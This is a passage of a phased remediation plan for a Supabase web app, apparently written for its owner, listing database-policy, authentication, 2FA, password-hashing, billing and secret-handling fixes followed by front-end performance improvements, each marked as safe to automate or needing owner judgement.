12. **[code] New migration: `leads` policies (H4) + drop `"Users can add themselves to team as owner"` (H9) + scoped `is_team_owner(uuid, uuid)` with all eight policy rewrites (H5) + `rbac_user_roles` policy (M10).** These four touch the same policy surface — ship as one migration. *H5 and M10 safe to automate. H4's DELETE restriction and H9's drop are safe; **verify first** whether any staff workflow depends on the unassigned-lead pool.*
13. **[code] Accounting role enforcement (H8)** — add `acc_org_role()`, split every write policy across the six `acc_*` migrations, derive `isAccountant` from the fetched role. *Owner judgement — this is the largest policy change in the plan and touches every accounting write path. Stage it against a Supabase branch and exercise the AR/AP/banking/VAT/payroll flows before merging.*
14. **[code] `site-visitor-auth`: scrypt/Argon2id + per-row salt + `password_algo` column + throttling + single body read (H10, M17).** *Safe to automate with transparent re-hash on next login; existing visitors keep working.*
15. **[code] Password Vault crypto (H11)** — PBKDF2 ≥600k for the AES key, separate Argon2id verifier, real TOTP verification server-side, drop the admin config-read policies. *Owner judgement — changing the KDF re-keys existing vaults. You need a migration path: on next successful unlock under the old scheme, re-encrypt every item under the new key. Do not ship the KDF change without it or users lose their vaults.*
16. **[code + dashboard] 2FA becomes authoritative (H7).** *Owner judgement, highest-effort item. Recommended: migrate to Supabase native MFA (**[dashboard]** enable MFA on the project) rather than patching the custom table, then require `aal2` in sensitive RLS. Interim **[code]**, safe to automate today: the `profiles_guard_privileged_cols()` BEFORE UPDATE trigger, which stops the one-request 2FA strip. Move `src/pages/CustomerLogin.tsx:258-263`'s self-write into `send-verification-email` first.*

### Phase 3 — medium

17. **[code] Delete `confirm-user-email` (M2)** — nothing calls it. *Safe to automate.*
18. **[code] Delete the unauthenticated `status` branch in `two-factor-auth` (M15); remove the `ip` field from the contract in `two-factor-auth/index.ts:424-442` and `src/hooks/useIPCheck.ts` (M11); atomic `consume_2fa_attempt` + used-code table (M12).** One change set. *Safe to automate; the IP field removal is a pure simplification.*
19. **[code + dashboard] `send-verification-email` (M1)** — pin the link host. **[dashboard]** set a `SITE_URL` secret on the project first, then **[code]** read it, apply the resend limit unconditionally, and return a uniform 200. *Safe to automate once the secret exists.*
20. **[code] LLM proxy auth + quotas (M3)** — `doc-ai`, `calendar-ai`, `seo-scrape`; remove their `verify_jwt = false` entries; fix or delete `marketing-copy-rewrite`'s invalid `npm:@supabase/supabase-js@2/cors` import. *Owner judgement — if any of these are called from an unauthenticated marketing surface, gating them will break it. Grep `src/` for each `functions.invoke` call site before flipping.*
21. **[code] New migration: `booking_settings` public view (M8), `comm_presence` scoping (M16), `acc_accountant_invites` WITH CHECK + token default + immutability trigger (M5), `acc_report_trial_balance` and the three FX functions (M7), `crm_run_workflow` guard (M9).** Ship as one policy-hardening migration. *M8 requires **[code]** changes to the booking widget/embed to read the view — check `src/components/booking/` and `ecommerce-embed` before dropping the old policy. The rest are safe to automate.*
22. **[code] `store-checkout`: resolve the merchant server-side, validate product ownership, gate `confirm` (M6).** *Owner judgement — depends on how the storefront passes merchant identity today.*
23. **[code + dashboard] Trial abuse (M4):** **[dashboard]** move `trial_period_days` onto the Stripe Prices, then **[code]** remove `subscription_data` from `create-subscriptions-checkout/index.ts:67` and move `grantedEmails` out of `check-subscriptions-plan` and `check-designer-subscription` into a `comp_accounts` table. *Dashboard step first; the code step is then safe.*
24. **[code] Entitlement in Postgres (M13)** — `has_active_subscription()` AND-ed into `inv_products`, `api_keys`, `automation_schedules` and the four other gated surfaces. *Owner judgement — this is where revenue leaks, but a wrong predicate locks out paying customers. Needs a reliable Stripe-synced subscriptions table first; verify it exists and is current before enforcing.*
25. **[code] Stop round-tripping third-party secrets (M14)** — encrypt on write via an edge function, `.select('provider, is_connected, connected_at')` at `ConnectionsSettings.tsx:407`, masked hints instead of pre-filled password inputs, and correct the false "encrypted at rest" copy at `:794`. *Safe to automate; users will need to re-enter existing credentials once.*
26. **[code] `crypto.getRandomValues` for generated passwords (M18)** and force a reset on accounts already created via `handleConvertToClient`. *Code safe to automate; the forced reset is **[dashboard]** and needs owner sign-off since it emails real customers.*

### Phase 4 — performance (all [code], all safe to automate, none touch auth)

27. `@babel/runtime` chunk rule in `vite.config.ts` — **115.6 KB gzip**, one line (P1).
28. Lazy `react-markdown` in `ChatBot.tsx` — **~32.9 KB gzip off the entry chunk** (P2).
29. `useIsMobile` lazy initializer in `FloatingScreenshotHero.tsx` — **~223 KB saved per mobile visit** (P3).
30. Commit the `dist-*` deletion and widen `.gitignore:11` — **125.8 MB** off every checkout (P13).
31. Font preload plugin, woff1 strip plugin, Inter removal from the body stack, favicon and logo re-encode (P6, P7, P8, P9, P10).
32. Route-scoped CSS extraction + critical-CSS inlining (P5); hero `srcset` (P4); `ParallaxImage` srcset passthrough (P11).
33. Runtime N+1 and unbounded-query fixes, in the order listed in P12 — `AdminMessaging` first (it multiplies across every open admin tab), then `LoungeCRM` virtualization, then the rest.